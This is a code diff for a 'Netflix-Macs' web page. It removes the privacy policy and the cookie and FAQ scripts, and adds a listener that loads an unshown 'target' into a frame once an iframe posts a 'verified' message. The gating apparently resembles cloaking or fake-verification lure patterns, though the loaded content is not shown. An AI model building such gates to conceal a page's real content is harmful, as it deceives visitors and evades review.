-                    <div>
-                        <h3 class="text-xl font-semibold text-gray-800 mb-3">3. Data Security</h3>
-                        <p>We implement industry-standard security measures to protect your personal information. All payment transactions are encrypted and processed through secure payment gateways. Your license information is stored securely and accessed only when necessary for support purposes.</p>
-                    </div>
-                    <div>
-                        <h3 class="text-xl font-semibold text-gray-800 mb-3">4. Local Data Processing</h3>
-                        <p>Netflix-Macs processes all your media files locally on your Mac device. No media content is ever uploaded to our servers or any third-party services unless you explicitly enable iCloud sync features. Your media library metadata remains private and under your control.</p>
-                    </div>
-                    <div>
-                        <h3 class="text-xl font-semibold text-gray-800 mb-3">5. Cookies and Analytics</h3>
-                        <p>Our website uses essential cookies to ensure proper functionality and remember your preferences. We may use anonymous analytics to understand how visitors interact with our website. You can control cookie settings through your browser preferences.</p>
-                    </div>
-                    <div>
-                        <h3 class="text-xl font-semibold text-gray-800 mb-3">6. Third-Party Services</h3>
-                        <p>We use trusted third-party services for payment processing and email delivery. These services are bound by their own privacy policies and are required to protect your information. We only share the minimum information necessary for these services to function.</p>
-                    </div>
-                    <div>
-                        <h3 class="text-xl font-semibold text-gray-800 mb-3">7. Your Rights</h3>
-                        <p>You have the right to access, correct, or delete your personal information at any time. You may also request a copy of the data we hold about you. To exercise these rights, please contact us at support@netflix-macs.vercel.app.</p>
-                    </div>
-                    <div>
-                        <h3 class="text-xl font-semibold text-gray-800 mb-3">8. Children's Privacy</h3>
-                        <p>Netflix-Macs is not intended for use by children under the age of 13. We do not knowingly collect personal information from children. If you believe we have inadvertently collected such information, please contact us immediately.</p>
-                    </div>
-                    <div>
-                        <h3 class="text-xl font-semibold text-gray-800 mb-3">9. Changes to This Policy</h3>
-                        <p>We may update this Privacy Policy from time to time to reflect changes in our practices or legal requirements. We will notify registered users of any material changes via email. The current version will always be available on this page.</p>
-                    </div>
-                    <div>
-                        <h3 class="text-xl font-semibold text-gray-800 mb-3">10. Contact Us</h3>
-                        <p>If you have any questions about this Privacy Policy or our data practices, please contact us at support@netflix-macs.vercel.app. We are committed to addressing your concerns and protecting your privacy.</p>
-                    </div>
-                    <div class="pt-4 border-t border-gray-200">
-                        <p class="text-sm text-gray-500">Last updated: December 2024</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <script>
-        function acceptCookies() {
-            document.getElementById('cookiePopup').style.display = 'none';
-            localStorage.setItem('cookiesAccepted', 'true');
-        }
-
-        function declineCookies() {
-            document.getElementById('cookiePopup').style.display = 'none';
-            localStorage.setItem('cookiesAccepted', 'false');
-        }
-
-        if (localStorage.getItem('cookiesAccepted')) {
-            document.getElementById('cookiePopup').style.display = 'none';
-        }
-
-        function toggleFaq(button) {
-            const content = button.nextElementSibling;
-            const icon = button.querySelector('.faq-icon');
-            
-            content.classList.toggle('active');
-            icon.classList.toggle('active');
-        }
-
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const target = document.querySelector(this.getAttribute('href'));
-                if (target) {
-                    target.scrollIntoView({
-                        behavior: 'smooth',
-                        block: 'start'
-                    });
-                }
-            });
-        });
-    </script>
-
+    window.addEventListener('message', (e) => {
+      if (!e || !e.data || e.data.type !== 'verified') return;
+      if (e.source !== iframe.contentWindow) return;
+      loadTargetIntoFrame();
+    });
+  </script>
 </body>
 </html>
-
